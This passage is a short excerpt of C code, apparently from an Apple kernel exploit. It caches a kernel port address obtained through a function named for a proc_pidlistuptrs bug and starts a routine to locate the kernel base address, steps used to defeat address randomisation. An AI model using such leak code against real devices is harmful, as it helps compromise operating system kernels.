...
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
    cached_task_self_addr = find_port_via_proc_pidlistuptrs_bug(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
...
uint64_t cached_kernel_base = 0;
uint64_t find_kernel_base() {
  if (cached_kernel_base != 0) {
    return cached_kernel_base;
  }
